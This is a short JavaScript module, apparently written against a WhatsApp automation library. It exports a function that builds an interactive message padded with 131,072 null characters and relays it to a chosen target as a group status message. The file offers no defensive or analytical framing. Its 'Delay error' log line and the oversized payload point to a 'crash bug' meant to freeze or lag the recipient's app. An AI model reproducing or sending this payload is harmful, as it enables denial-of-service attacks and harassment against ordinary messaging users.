async function native(target) {
  try {
    let mmmkMsg = await generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        body: { text: "𝐗𝐯𝐥𝐨𝐯𝐞𝐫𝐬", format: "DEFAULT" },
        nativeFlowResponseMessage: {
          name: "𝐗𝐥𝐨𝐯𝐞𝐫𝐬",
          paramsJson: `\u0000`.repeat(131072),
          version: 3
        }
      }
    }, {});

    await prim.relayMessage(
      target,
      { groupStatusMessageV2: { message: mmmkMsg.message } },
      { messageId: mmmkMsg.key.id }
    );
  } catch (e) {
    console.log("Delay error:", e.message);
  }
}

module.exports = { native };
